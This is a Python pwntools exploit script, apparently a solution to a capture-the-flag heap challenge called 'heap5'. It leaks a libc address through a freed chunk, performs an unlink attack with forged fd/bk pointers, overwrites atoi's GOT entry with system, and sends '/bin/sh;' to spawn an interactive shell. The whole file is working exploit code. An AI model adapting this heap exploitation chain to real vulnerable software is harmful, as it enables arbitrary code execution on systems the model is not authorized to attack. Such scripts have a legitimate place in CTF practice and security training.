from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'split', '-h']
elf = ELF('./heap5')

ru = lambda p, x        : p.recvuntil(x)
sn = lambda p, x        : p.send(x)
rl = lambda p           : p.recvline()
sl = lambda p, x        : p.sendline(x)
rv = lambda p, x=1024   : p.recv(numb = x)
sa = lambda p, a, b     : p.sendafter(a,b)
sla = lambda p, a, b    : p.sendlineafter(a,b)
rr = lambda p, t        : p.recvrepeat(t)
rd = lambda p, x        : p.recvuntil(x, drop=True)

# io = gdb.debug(['./heap5'], "b 43\nc")

io = process("./heap5")

def choice(p, idx):
    sla(p, "choice : ", str(idx))

def add(p, idx, size):
    choice(p, 1)
    sla(p, "idx plz : ", str(idx))
    sla(p, "size plz : ", str(size))

def rm(p, idx):
    choice(p, 2)
    sla(p, "idx plz : ", str(idx))

def show(p, idx):
    choice(p, 3)
    sla(p, "idx plz : ", str(idx))

def edit(p, idx, data):
    choice(p, 4)
    sla(p, "idx plz : ", str(idx))
    sa(p, "content plz : ", data)


add(io, 0, 0x100)
add(io, 1, 0x100)
rm(io, 0)
show(io, 0)

libc_addr = u64(rv(io, 6)+b'\0\0')

print("libc_addr : " + hex(libc_addr))
libc = elf.libc
libc.address = libc_addr - 0x3c4b78
print("libc.address : " + hex(libc.address))

rm(io, 1)

add(io, 0, 0x110)
add(io, 2, 0xf0)
add(io, 3, 0xf0)
add(io, 4, 0xf0)

# into unsorted bin
rm(io, 2)

# into small bin
add(io, 7, 0x200)

p_addr = 0x6020E8

#change fd and bk
edit(io, 2, flat(p_addr - 0x18, p_addr - 0x10))

# gdb.attach(io, "b free")
# unlink
rm(io, 3)

edit(io, 1, flat(0x100, 0x100, elf.got['atoi']))

edit(io, 0, p64(libc.symbols['system']))

# gdb.attach(io)

choice(io, "/bin/sh;")

io.interactive()